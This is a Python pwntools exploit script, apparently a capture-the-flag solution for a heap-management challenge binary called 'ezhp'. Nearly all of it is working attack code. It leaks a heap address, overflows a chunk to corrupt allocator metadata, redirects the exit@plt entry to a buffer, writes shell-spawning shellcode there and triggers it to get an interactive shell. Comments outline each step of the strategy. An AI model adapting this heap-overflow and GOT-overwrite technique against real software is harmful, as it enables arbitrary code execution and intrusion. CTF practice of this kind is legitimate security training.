#!/usr/bin/env python2


from pwn import *

# offsets:
# alloc two blocks with size 32 each
# then address is at offset 44, and is added with 4
# written data is at offset 40
# can leak address of buffer on 'heap'
# set exit@plt to start of buf, then write shellcode to buf, then exit

# leak strat:
# alloc 3 buffers
# write 'a' * 40 to buf 0
# read from buf 0 to get pointer to buf 2, add 12 to that to get ptr to buf 2 contents
# free, put buf 2 into exit, then write shellcode to buf 2
#context.log_level = 'DEBUG'
r = process("./ezhp")
# make three blocks
r.recvuntil("option.\n")
r.sendline("1")
r.sendline("32")
r.recvuntil("option.\n")
r.sendline("1")
r.sendline("32")
r.recvuntil("option.\n")
r.sendline("1")
r.sendline("32")

# leak pointer to buf 2
buf = "a" * 40
r.recvuntil("option.\n")
r.sendline("3")
r.recvuntil("id.\n")
r.sendline("0")
r.recvuntil("size.\n")
r.sendline(str(len(buf)))
r.recvuntil("data.\n")
r.send(buf)
# get leak
r.recvuntil("option.\n")
r.sendline("4")
r.sendline("0")
r.recvuntil("a" * 40)
buf2 = u32(r.recvn(4)) + 12
log.info("shellcode addr: " + hex(buf2))

# now overflow buffer 1 with our setup
buf = "a" * 40 + p32(buf2) + p32(0x0804a010 - 4)
r.recvuntil("option.\n")
r.sendline("3")
r.recvuntil("id.\n")
r.sendline("0")
r.recvuntil("size.\n")
r.sendline(str(len(buf)))
r.recvuntil("data.\n")
r.send(buf)

# now free it
r.recvuntil("option.\n")
r.sendline("2")
r.sendline("1")

# now put our shellcode in the buffer
r.recvuntil("option.\n")
r.sendline("3")
r.recvuntil("id.\n")
r.sendline("2")
buf = asm(shellcraft.sh())
r.recvuntil("size.\n")
r.sendline(str(len(buf)))
r.recvuntil("data.\n")
r.sendline(buf)

# now exit
r.recvuntil("option.\n")
r.sendline("6")
r.interactive()
